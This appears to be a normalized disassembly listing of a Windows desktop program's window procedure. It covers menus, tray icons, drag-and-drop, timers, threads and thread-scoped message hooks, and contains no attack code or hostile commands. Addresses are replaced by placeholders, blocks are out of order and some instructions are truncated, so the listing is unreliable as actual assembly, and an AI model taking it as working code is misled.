call sub_452500
mov esi [ esp + 0x78 ]
sub esi eax
mov eax [ rw-data ]
add eax edi
imul eax [ esp + 0x88 ]
mov [ esp + 0x50 ] eax
fild [ esp + 0x50 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ rw-data ]
add esi eax
mov [ esp + 0x68 ] esi
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx [ rw-data ]
mov edx [ esp + 0x2c ]
mov edi [ esp + 0x80 ]
add ecx edx
imul ecx [ esp + 0x4c ]
mov [ esp + 0x50 ] ecx
sub edi eax
fild [ esp + 0x50 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx [ esp + 0x64 ]
add edi eax
mov eax [ esp + 0xb4 ]
lea edx [ edi + ecx ]
mov ecx [ esp + 0x90 ]
add eax esi
add esp 0x4
cmp esi ecx
mov [ esp + 0x68 ] edi
mov [ esp + 0x6c ] eax
mov [ esp + 0x70 ] edx
jge r-xdata
push esi
call j_sub_4b692d
add esp 0x4
push edi
call j_sub_4b692d
add esp 0x4
sub_49d1a0
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_4c17f0
push eax
mov eax 0x10930
mov [ fs : 0x0 ] esp
call sub_4b6180
push ebx
push ebp
push esi
mov esi [ esp + 0x10950 ]
push edi
mov edi 0x10
cmp esi edi
ja r-xdata
cmp esi 0x214
ja r-xdata
je r-xdata
cmp esi 0x1600
ja r-xdata
je r-xdata
push rw-data
lea ecx [ esp + 0x60 ]
call sub_46a410
mov edi [ esp + 0x60 ]
test edi edi
jne r-xdata
lea eax [ esi - 0x1 ]
cmp eax 0x6
ja r-xdata
cmp esi 0x1800
ja r-xdata
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp esi 0x112
ja r-xdata
mov eax [ esp + 0x64 ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esp + 0x1095c ]
mov ecx [ esp + 0x10958 ]
mov edx [ esp + 0x10950 ]
push eax
push ecx
push esi
push edx
call [ DefWindowProcA@IAT ]
jmp r-xdata
jmp [ eax * 4 + jump_table_4a31d0 ]
cmp esi 0x1801
je r-xdata
je r-xdata
push 0x0
call sub_48edc0
add esp 0x4
jmp r-xdata
cmp esi 0x1410
ja r-xdata
xor eax eax
cmp esi 0x211
ja r-xdata
je r-xdata
test edi edi
je r-xdata
mov eax [ edi + esi * 4 ]
cmp [ rw-data ] eax
je r-xdata
mov ebx [ DestroyWindow@IAT ]
lea esi [ eax - 0x1 ]
test esi esi
jl r-xdata
mov ecx [ esp + 0x10940 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x1093c
retn 0x10
mov eax [ rw-data ]
mov eax [ esp + 0x10958 ]
test eax eax
jne r-xdata
mov esi [ esp + 0x10950 ]
mov [ rw-data ] esi
call sub_46fe50
lea edx [ esp + 0x5c ]
push edx
mov [ esp + 0x60 ] 0x8
mov [ esp + 0x64 ] 0x210
call [ InitCommonControlsEx@IAT ]
mov al [ rw-data ]
mov edi [ ShowWindow@IAT ]
xor ebx ebx
test al al
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor ebp ebp
cmp eax ebp
je r-xdata
mov ecx [ rw-data ]
mov esi [ WaitForSingleObject@IAT ]
push 0xffffffff
push ecx
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
call esi
mov edx [ rw-data ]
mov edi [ CloseHandle@IAT ]
push edx
call edi
mov eax [ rw-data ]
push 0xffffffff
push eax
mov [ rw-data ] 0x1
call esi
mov ecx [ rw-data ]
push ecx
call edi
mov edx [ rw-data ]
push 0xffffffff
push edx
call esi
mov eax [ rw-data ]
push eax
call edi
mov ebx [ DeleteObject@IAT ]
mov edi [ DeleteDC@IAT ]
xor ebp ebp
xor esi esi
jmp r-xdata
push rw-data
lea ecx [ esp + 0x7c ]
call sub_4043f0
mov eax [ esp + 0x1095c ]
test eax eax
mov [ esp + 0x10948 ] 0xe
jne r-xdata
mov ecx rw-data
mov [ esp + 0x78 ] rw-data
call sub_404310
mov eax [ esp + 0x1095c ]
test eax eax
mov [ esp + 0x10948 ] 0x4
je r-xdata
mov eax esi
sub eax 0x1700
je r-xdata
mov eax esi
sub eax 0x1420
je r-xdata
je r-xdata
cmp esi 0x212
jne r-xdata
je r-xdata
mov esi [ esp + 0x10958 ]
cmp esi 0xf140
je r-xdata
lea eax [ esi - 0x4a ]
cmp eax 0xc7
ja r-xdata
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
push edx
call [ SendMessageA@IAT ]
mov esi [ esp + 0x10950 ]
push rw-data
push esi
mov [ rw-data ] 0x1
call sub_462f40
add esp 0x8
push esi
call ebx
jmp r-xdata
push edi
call j_sub_4b66ed#2
add esp 0x4
dec esi
jns r-xdata
push eax
call ebx
mov al [ rw-data ]
test al al
je r-xdata
push esi
call sub_451570
add esp 0x4
call sub_451a10
mov [ rw-data ] eax
cmp [ rw-data ] ebx
je r-xdata
push esi
call sub_495c30
add esp 0x4
push 0x5
push eax
mov [ rw-data ] eax
call edi
mov eax [ esp + 0x10950 ]
push eax
call [ IsIconic@IAT ]
test eax eax
jne r-xdata
mov ebx [ esp + 0x10958 ]
cmp ebx 0x1
jne r-xdata
mov edx [ esp + 0x10950 ]
push edx
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov eax [ esi + rw-data ]
cmp eax ebp
je r-xdata
mov esi [ rw-data ]
mov ecx rw-data
mov [ esp + 0x48 ] esi
mov ebx esi
mov ebp esi
call sub_4010f0
cmp esi eax
jge r-xdata
mov ecx [ esp + 0x78 ]
jmp r-xdata
mov ecx rw-data
jmp r-xdata
mov cl [ eax + 0xa8 ]
test cl cl
je r-xdata
mov esi [ rw-data ]
test esi esi
mov edi [ esp + 0x1095c ]
jl r-xdata
sub eax 0x3
jne r-xdata
mov eax [ esp + 0x1095c ]
sub eax 0x201
je r-xdata
sub eax 0x2
jne r-xdata
mov ecx [ rw-data ]
mov esi [ CreateThread@IAT ]
push rw-data
push 0x0
push rw-data
push sub_474320
push 0x0
push 0x0
mov [ rw-data ] ecx
mov [ rw-data ] 0x0
call esi
mov edx [ rw-data ]
mov [ esp + 0x5c ] 0xfffffff1
mov [ esp + 0x60 ] 0xfffffffe
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x68 ] 0x1
mov [ esp + 0x6c ] 0x2
mov ecx [ esp + edx * 4 + 0x5c ]
push ecx
push eax
mov [ rw-data ] eax
call [ SetThreadPriority@IAT ]
mov edx [ rw-data ]
push rw-data
push 0x0
push rw-data
push r-xdata
push 0x0
push 0x0
mov [ rw-data ] edx
mov [ rw-data ] 0x0
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax esi
sub eax 0x232
je r-xdata
mov eax [ rw-data ]
xor edi edi
cmp eax 0x1
jne r-xdata
mov eax [ esp + 0x10958 ]
xor edi edi
cmp eax edi
jne r-xdata
mov eax esi
sub eax 0x113
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0xf170
jne r-xdata
movzx eax [ eax + lookup_table_4a3200 ]
jmp [ eax * 4 + jump_table_4a31ec ]
mov ecx [ esp + 0x10950 ]
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push 0xfffffffe
push ecx
call [ SetWindowPos@IAT ]
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
push 0x1
call sub_451820
add esp 0x4
mov al [ rw-data ]
test al al
jne r-xdata
mov eax 0x2
cmp ebx eax
je r-xdata
mov [ rw-data ] ebp
jmp r-xdata
call sub_43d200
mov eax [ esi + rw-data ]
cmp eax ebp
je r-xdata
push eax
call edi
mov [ esi + rw-data ] ebp
push ebx
mov ecx rw-data
call sub_42cee0
mov eax [ esp + 0x1095c ]
add eax 0x2c
push eax
call sub_45dd10
add esp 0x4
test al al
je r-xdata
imul esi esi 0x70
mov edi esi
jmp r-xdata
call sub_401420
mov eax [ eax + 0x90 ]
cmp eax 0x2
je r-xdata
mov [ rw-data ] 0x0
call sub_46fe50
mov esi [ esp + 0x10950 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call sub_466930
mov eax [ rw-data ]
add esp 0x18
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
push r--data
push esi
call [ SetWindowTextA@IAT ]
mov ecx rw-data
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov ecx rw-data
call sub_4010f0
cmp esi eax
jge r-xdata
mov ebx [ esp + 0x1095c ]
cmp [ rw-data ] ebx
jne r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x91
call sub_48a5f0
add esp 0xc
jmp r-xdata
sub eax 0x4
jne r-xdata
mov esi [ esp + 0x1095c ]
lea ecx [ esi + 0xfc ]
call sub_41f020
mov [ esp + 0x4c ] eax
cmp [ esi + 0x360 ] edi
jb r-xdata
mov eax [ rw-data ]
test eax eax
mov ebx [ esp + 0x10950 ]
je r-xdata
mov eax [ rw-data ]
push rw-data
push 0x0
push rw-data
push sub_47e970
push 0x0
push 0x0
mov [ rw-data ] eax
mov [ rw-data ] 0x0
call esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
dec eax
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
mov al [ rw-data ]
test al al
mov [ rw-data ] 0x1
je r-xdata
call sub_495d00
jmp r-xdata
sub eax 0x4
jne r-xdata
call [ timeGetTime@IAT ]
sub eax [ rw-data ]
cmp eax 0xea60
jae r-xdata
call [ GetFocus@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x1095c ]
mov edx [ esp + 0x10950 ]
push ecx
push esi
push 0x112
push edx
call [ DefWindowProcA@IAT ]
jmp r-xdata
mov ebx [ esp + 0x10958 ]
movzx ebp bx
mov eax ebp
cmp eax 0x13e
jg r-xdata
mov eax [ esp + 0x1095c ]
mov edx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
mov esi [ eax + edx - 0x4 ]
mov ecx [ eax + edx - 0xc ]
mov edi [ eax + edx - 0x8 ]
add eax edx
test esi esi
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov edi [ esp + 0x10958 ]
cmp edi 0x12
mov [ rw-data ] 0x1
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push 0x1
call sub_451930
add esp 0x4
mov ecx [ rw-data ]
push 0x0
push ecx
call sub_43ff60
add esp 0x8
jmp r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
cmp ebx ebp
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
add esi 0x4
cmp esi 0x14
jl r-xdata
push eax
call ebx
mov [ esi + rw-data ] ebp
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0x48 ]
mov ebp eax
mov [ esp + 0x10 ] eax
imul eax eax 0x70
mov ebx eax
mov edi eax
mov eax [ rw-data ]
cmp [ esi + eax + 0x18 ] 0x10
jb r-xdata
mov ecx rw-data
call sub_4010f0
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
mov esi [ rw-data ]
test esi esi
jl r-xdata
mov eax [ rw-data ]
imul esi esi 0x70
lea ecx [ edi + 0x8 ]
add esi eax
push ecx
push esi
call sub_4013c0
add esp 0x8
test al al
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebx + 0x28 ]
cmp eax 0xf
je r-xdata
call [ CreatePopupMenu@IAT ]
lea edx [ esp + 0x18 ]
push edx
mov esi eax
push 0x1
xor ebx ebx
xor eax eax
mov ecx 0xc
lea edi [ esp + 0x20 ]
[ edi ]
mov edi [ InsertMenuItemA@IAT ]
push ebx
push esi
mov [ esp + 0x28 ] 0x30
mov [ esp + 0x2c ] 0x12
mov [ esp + 0x38 ] 0x1
mov [ esp + 0x30 ] ebx
mov [ esp + 0x4c ] r--data
mov [ esp + 0x50 ] 0x8
call edi
lea eax [ esp + 0x18 ]
push eax
push 0x1
push 0x1
push esi
mov [ esp + 0x38 ] 0x2
mov [ esp + 0x30 ] 0x800
call edi
lea ecx [ esp + 0x18 ]
push ecx
push 0x1
push 0x2
push esi
mov [ esp + 0x38 ] 0x3
mov [ esp + 0x30 ] ebx
mov [ esp + 0x4c ] r--data
mov [ esp + 0x50 ] 0x4
call edi
lea edx [ esp + 0x5c ]
push edx
call [ GetCursorPos@IAT ]
mov eax [ rw-data ]
mov ecx [ esp + 0x60 ]
mov edx [ esp + 0x5c ]
push ebx
push eax
push ebx
push ecx
push edx
push 0x100
push esi
call [ TrackPopupMenu@IAT ]
push esi
mov edi eax
call [ DestroyMenu@IAT ]
cmp edi ebx
je r-xdata
lea eax [ esi + 0x34c ]
mov eax [ esi + 0x34c ]
jmp r-xdata
mov ecx rw-data
xor esi esi
call sub_45d8a0
test eax eax
jle r-xdata
mov esi [ GetWindowThreadProcessId@IAT ]
push 0x0
push ebx
call esi
mov edi [ SetWindowsHookExA@IAT ]
push eax
push 0x0
push sub_45bbf0
push 0x3
call edi
push 0x0
push ebx
mov [ rw-data ] eax
call esi
push eax
push 0x0
push sub_45bb90
push 0x7
call edi
mov [ rw-data ] eax
mov edi 0x10
mov eax [ esp + 0x10950 ]
push rw-data
push eax
call [ GetWindowRect@IAT ]
jmp r-xdata
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x5
push edx
mov [ rw-data ] 0x2
call [ SendMessageA@IAT ]
mov ecx [ esp + 0x10958 ]
mov ebp [ DragQueryFileA@IAT ]
push 0x0
push 0x0
push 0xffffffff
push ecx
call ebp
mov ebx eax
mov eax [ esp + 0x1095c ]
test eax eax
mov [ esp + 0x48 ] ebx
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
mov ecx [ rw-data ]
cmp ecx edi
je r-xdata
mov esi [ esp + 0x1095c ]
mov eax esi
shr eax 0x10
test eax eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp eax 0x15e
jg r-xdata
je r-xdata
cmp ecx 0xffffffff
mov eax 0x1
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push edx
push 0x0
call sub_423c30
add esp 0x18
jmp r-xdata
mov ecx [ esp + 0x1095c ]
mov edx [ esp + 0x10958 ]
mov eax [ esp + 0x10950 ]
push ecx
push edx
push esi
push eax
call [ DefWindowProcA@IAT ]
jmp r-xdata
cmp edi 0x1b
jne r-xdata
mov ecx [ esp + 0x1095c ]
mov edx [ esp + 0x10950 ]
push ecx
push edi
push esi
push edx
call [ DefWindowProcA@IAT ]
jmp r-xdata
test [ rw-data ] 0x8
je r-xdata
call sub_452350
push 0x1
call sub_451690
add esp 0x4
cmp ebx eax
mov [ rw-data ] eax
jne r-xdata
cmp ebx ebp
jne r-xdata
cmp [ rw-data ] ebp
jne r-xdata
mov eax [ esp + 0x1095c ]
mov ecx eax
shr ecx 0x10
movzx edx ax
push ecx
push edx
call sub_451550
add esp 0x8
mov al [ rw-data ]
test al al
je r-xdata
call sub_435d40
call sub_43fec0
call sub_4b2d10
mov ecx [ rw-data ]
cmp ecx ebp
je r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
lea eax [ esi + eax + 0x4 ]
mov eax [ esi + eax + 0x4 ]
jmp r-xdata
mov edi [ esp + 0x1095c ]
mov eax [ edi + 0x9c ]
test eax eax
jl r-xdata
call sub_42cf20
mov ecx rw-data
xor edi edi
xor ebp ebp
call sub_4010f0
test eax eax
jle r-xdata
mov ecx rw-data
call sub_4010f0
cmp esi eax
jge r-xdata
mov edx [ rw-data ]
push edx
call [ IsWindow@IAT ]
test eax eax
je r-xdata
mov esi [ rw-data ]
test esi esi
jl r-xdata
mov ecx [ esp + 0x10958 ]
push ebx
push ecx
push 0x1703
push eax
call [ SendMessageA@IAT ]
cmp [ ebx + 0x7c ] 0x4
jb r-xdata
cmp eax 0xe
jne r-xdata
cmp edi 0x3
jne r-xdata
lea edi [ esi + 0x20 ]
mov edi [ esi + 0x20 ]
jmp r-xdata
cmp [ esi + 0x34 ] edi
jb r-xdata
push edi
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
mov edi [ rw-data ]
add edi 0x4
mov edx [ esp + 0x10958 ]
push 0x208
lea ecx [ esp + 0x4c8 ]
push ecx
push 0x0
push edx
call ebp
test eax eax
je r-xdata
test [ rw-data ] 0x8
mov esi [ GetCursorPos@IAT ]
mov edi [ GetWindowRect@IAT ]
je r-xdata
mov ecx [ rw-data ]
push ecx
call [ GetMenu@IAT ]
mov edx [ rw-data ]
mov esi [ LockWindowUpdate@IAT ]
push edx
mov [ rw-data ] eax
mov [ rw-data ] 0x3
call esi
mov eax [ rw-data ]
push edi
push eax
call [ SetMenu@IAT ]
push edi
call esi
cmp [ rw-data ] edi
je r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call [ GetFocus@IAT ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax 0x9c43
jg r-xdata
je r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x99
call sub_48a5f0
add esp 0xc
jmp r-xdata
cmp eax 0xbd
jg r-xdata
cmp edi 0x4
jne r-xdata
test ecx ecx
jne r-xdata
mov ebx [ esp + 0x1095c ]
mov ebp [ esp + 0x10950 ]
push ebx
push edi
push ebp
call sub_48ed30
add esp 0xc
test eax eax
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push 0x1
call sub_451770
add esp 0x4
mov [ rw-data ] eax
call sub_43d290
jmp r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp ebx 0x1
je r-xdata
mov eax [ esp + 0x1095c ]
mov ecx eax
shr ecx 0x10
lea esi [ ecx - 0x14 ]
movzx edi ax
push esi
push edi
call sub_451550
mov edx [ rw-data ]
add esp 0x8
push 0x1
push 0x14
push edi
push esi
push ebp
push edx
call [ MoveWindow@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push eax
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
call sub_4af790
call sub_46fe50
xor esi esi
lea esp [ esp ]
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
cmp eax 0x1
jbe r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] edx
jbe r-xdata
push ebp
mov ecx rw-data
call sub_42cee0
mov eax [ esp + 0x1095c ]
mov edx [ eax + 0x40 ]
add eax 0x2c
mov ecx 0x10
cmp [ eax + 0x18 ] ecx
jb r-xdata
cmp [ esp + 0x10 ] edx
jge r-xdata
mov ecx rw-data
inc ebp
add esi 0x70
call sub_4010f0
cmp ebp eax
jl r-xdata
mov eax [ rw-data ]
lea ecx [ esi + eax ]
push ecx
lea ecx [ edi + eax ]
call sub_402540
mov edx [ rw-data ]
mov [ edi + edx + 0x48 ] ebx
mov eax [ rw-data ]
mov [ edi + eax + 0x38 ] ebx
inc ebx
add edi 0x70
push eax
call sub_439280
add esp 0x4
cmp eax 0x7
je r-xdata
lea ecx [ esp + 0x2b0 ]
push r--data
push ecx
mov [ rw-data ] 0x132
call [ wsprintfA@IAT ]
add esp 0x8
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push edi
mov ecx rw-data
call sub_42cee0
mov ebp [ esp + 0x1095c ]
add ebp 0x2c
push ebp
call sub_45dd10
add esp 0x4
test al al
je r-xdata
xor esi esi
xor ebx ebx
jmp r-xdata
mov ebp [ rw-data ]
imul esi esi 0x70
add edi 0x8
add esi ebp
push edi
push esi
call sub_4013c0
add esp 0x8
test al al
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov ecx rw-data
call sub_4010f0
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] 0x131
je r-xdata
cmp [ ebx + 0x80 ] 0x10
jb r-xdata
mov eax [ rw-data ]
lea ecx [ esp + 0xb8 ]
push ecx
push 0x2
mov [ esp + 0xc0 ] 0x58
mov [ esp + 0xc4 ] eax
mov [ esp + 0xc8 ] ebx
call [ Shell_NotifyIconA@IAT ]
mov edx [ rw-data ]
push ebx
push ebx
push 0x10
push edx
call [ PostMessageA@IAT ]
jmp r-xdata
push 0x1
push 0x0
push 0x0
push eax
lea edx [ esp + 0x5c ]
push edx
push 0x1
push 0x0
lea ecx [ esi + 0xe0 ]
call sub_41f020
mov ecx [ rw-data ]
push eax
mov eax [ esp + 0x10978 ]
push eax
push ecx
push edi
call sub_4863a0
add esp 0x2c
jmp r-xdata
xor eax eax
push eax
push ebx
mov [ rw-data ] eax
call [ RegisterDragDrop@IAT ]
jmp r-xdata
push ebx
mov ecx eax
call sub_45f7f0
push eax
push ebx
mov [ rw-data ] eax
call [ RegisterDragDrop@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x14
push 0x1
push ecx
call [ SetTimer@IAT ]
mov [ rw-data ] eax
mov ecx rw-data
inc esi
add edi 0xdc
call sub_45d8a0
cmp esi eax
jl r-xdata
mov ecx [ esp + 0x10958 ]
push ecx
call [ DragFinish@IAT ]
jmp r-xdata
call sub_46fe50
mov esi 0x1
push esi
lea eax [ esp + 0x4c8 ]
push 0xffffffff
push eax
call sub_425d10
mov eax [ esp + 0x54 ]
add esp 0xc
cmp eax esi
jbe r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov esi [ esp + 0x10950 ]
push edi
push edi
push edi
push edi
sub ecx edx
push edi
push esi
mov [ rw-data ] ecx
call sub_466930
add esp 0x18
push esi
call [ UpdateWindow@IAT ]
mov eax [ rw-data ]
push sub_45cdc0
push 0xc8
push 0x2
push eax
call [ SetTimer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
push edi
push ecx
call sub_43ff60
add esp 0x8
cmp eax 0x2
jne r-xdata
mov edx [ rw-data ]
mov esi [ rw-data ]
push edi
push edi
push 0x200
push edx
mov [ rw-data ] edi
call [ SendMessageA@IAT ]
mov [ rw-data ] esi
jmp r-xdata
xor eax eax
mov ecx 0xc
lea edi [ esp + 0x18 ]
[ edi ]
movzx eax si
cmp eax 0x18
ja r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push ecx
call [ SendMessageA@IAT ]
sub eax 0x9c44
cmp eax 0x7f
ja r-xdata
je r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x90
call sub_48a5f0
add esp 0xc
jmp r-xdata
sub eax 0x13f
cmp eax 0x17
ja r-xdata
sub eax 0xbe
cmp eax 0x75
ja r-xdata
je r-xdata
cmp edi 0xffffffff
mov esi [ rw-data ]
je r-xdata
push edx
call sub_464fe0
add esp 0x4
jmp r-xdata
cmp ecx eax
mov [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] eax
jmp r-xdata
push ebx
push edi
push esi
push ebp
mov [ rw-data ] al
call [ DefWindowProcA@IAT ]
jmp r-xdata
mov eax [ esp + 0x10950 ]
push 0x0
push 0x9c60
push 0x111
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
push ebx
push sub_488db0
push esi
push 0xa1
push 0xfffffffa
push esi
call [ GetWindowLongA@IAT ]
push eax
call [ CreateDialogParamA@IAT ]
push 0x5
push eax
mov [ rw-data ] eax
call edi
mov eax [ esp + 0x10950 ]
push rw-data
push eax
call [ GetWindowRect@IAT ]
mov al [ rw-data ]
test al al
jne r-xdata
cmp ebx 0x2
je r-xdata
inc esi
cmp esi 0x4
jl r-xdata
push esi
call sub_423170
push esi
call sub_4231b0
add esp 0x8
push rw-data
lea ecx [ esp + 0x60 ]
call sub_46a410
lea ecx [ esp + 0x5c ]
call sub_42c3a0
mov esi eax
dec esi
js r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x0
push eax
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x1095c ]
mov cl [ eax + 0x94 ]
test cl cl
mov ebx [ eax + 0x48 ]
mov esi eax
jne r-xdata
mov esi [ rw-data ]
sub esi eax
sar esi 0x2
xor esi esi
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ edi + 0x51 ] 0x1
jne r-xdata
mov ecx 0x1
test eax eax
jge r-xdata
test eax eax
jle r-xdata
xor edi edi
mov ecx rw-data
xor ebx ebx
mov [ esp + 0x10 ] edi
call sub_4010f0
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ ebx + eax + 0x18 ] 0x10
jb r-xdata
mov ecx [ rw-data ]
push ecx
call [ GetDC@IAT ]
mov esi eax
push 0x0
push esi
mov [ rw-data ] 0x200
call sub_473580
mov edx [ rw-data ]
add esp 0x8
push esi
push edx
call [ ReleaseDC@IAT ]
jmp r-xdata
push eax
mov eax [ rw-data ]
push eax
call [ KillTimer@IAT ]
mov esi [ rw-data ]
test esi esi
jl r-xdata
mov eax [ rw-data ]
imul esi esi 0x70
lea edx [ ebx + 0x8 ]
add esi eax
push edx
push esi
call sub_4013c0
add esp 0x8
test al al
je r-xdata
mov ecx [ rw-data ]
push sub_45ba40
push 0x1388
push 0x3
push ecx
call [ SetTimer@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
push eax
mov eax [ rw-data ]
push eax
call [ KillTimer@IAT ]
lea eax [ ebx + 0x6c ]
mov eax [ ebx + 0x6c ]
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
lea edx [ esp + 0x4c ]
push edx
push eax
call edi
lea eax [ esp + 0x5c ]
push eax
call esi
mov eax [ esp + 0x5c ]
cmp [ esp + 0x4c ] eax
jg r-xdata
mov eax [ rw-data ]
push ecx
push eax
call [ SetMenu@IAT ]
mov [ rw-data ] edi
jmp r-xdata
movzx edx [ eax + lookup_table_4a36dc ]
jmp [ edx * 4 + jump_table_4a36ac ]
cmp bx 0x138
mov edi [ esp + 0x10950 ]
jb r-xdata
movzx ecx [ eax + lookup_table_4a3610 ]
jmp [ ecx * 4 + jump_table_4a35b0 ]
xor eax eax
mov ecx 0x16
lea edi [ esp + 0xb8 ]
[ edi ]
lea eax [ esp + 0x130 ]
xor ebx ebx
push eax
mov [ esp + 0x6d0 ] bl
mov [ esp + 0xbc ] 0x4c
mov [ esp + 0x134 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
sub eax 0x168
cmp eax 0x16
ja r-xdata
jmp [ eax * 4 + jump_table_4a34f4 ]
movzx ecx [ eax + lookup_table_4a347c ]
jmp [ ecx * 4 + jump_table_4a3404 ]
mov eax [ rw-data ]
push eax
push 0x1
push 0x4a
call sub_48a5f0
add esp 0xc
jmp r-xdata
cmp eax 0xbc
ja r-xdata
push eax
push 0xffffffff
push edx
call sub_425d10
add esp 0xc
mov [ rw-data ] esi
jmp r-xdata
mov [ rw-data ] edi
cmp ecx 0x2
jne r-xdata
mov [ rw-data ] eax
jmp r-xdata
call sub_43d170
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ rw-data ] ebp
jmp r-xdata
mov al [ esi + rw-data ]
test al al
je r-xdata
call sub_405030
call sub_4078e0
call sub_416b80
mov eax [ rw-data ]
cmp eax ebp
mov esi [ UnhookWindowsHookEx@IAT ]
je r-xdata
lea ecx [ esp + 0x5c ]
call sub_462cf0
mov ebx [ DestroyWindow@IAT ]
mov edi [ esp + 0x60 ]
lea esp [ esp ]
mov eax [ esp + 0x10950 ]
push eax
call sub_466150
mov ecx [ esp + 0x7c ]
push 0x1
push eax
call [ EnableWindow@IAT ]
movzx ecx [ rw-data ]
mov edx [ rw-data ]
shl ecx 0x10
or ecx 0x1
push ecx
push 0x1
push 0x406
push edx
call [ PostMessageA@IAT ]
test ebx ebx
jge r-xdata
lea ebp [ esi + 0x2c ]
lea edx [ esi + 0x4 ]
push ebp
push edx
call sub_4013c0
add esp 0x8
test al al
jne r-xdata
jmp r-xdata
push 0x0
push edx
mov ecx rw-data
call sub_42c920
cmp esi [ rw-data ]
mov eax esi
jge r-xdata
lea esi [ edi + esi + 0x4 ]
mov esi [ edi + esi + 0x4 ]
jmp r-xdata
cmp [ edi + esi + 0x18 ] ecx
jb r-xdata
mov eax [ edi + 0x8c ]
test eax eax
je r-xdata
mov al [ edi + 0x94 ]
test al al
mov ebx [ wsprintfA@IAT ]
jne r-xdata
mov eax [ edi + 0x4c ]
cmp eax 0x10
je r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
push sub_45ba40
push 0x1388
push 0x3
push ecx
mov [ rw-data ] 0x134
mov [ rw-data ] eax
call [ SetTimer@IAT ]
mov edx [ rw-data ]
push edx
mov [ rw-data ] eax
call [ GetDC@IAT ]
mov esi eax
push 0x0
push esi
call sub_473580
mov eax [ rw-data ]
add esp 0x8
push esi
push eax
call [ ReleaseDC@IAT ]
push ebx
mov ecx rw-data
call sub_42cee0
xor esi esi
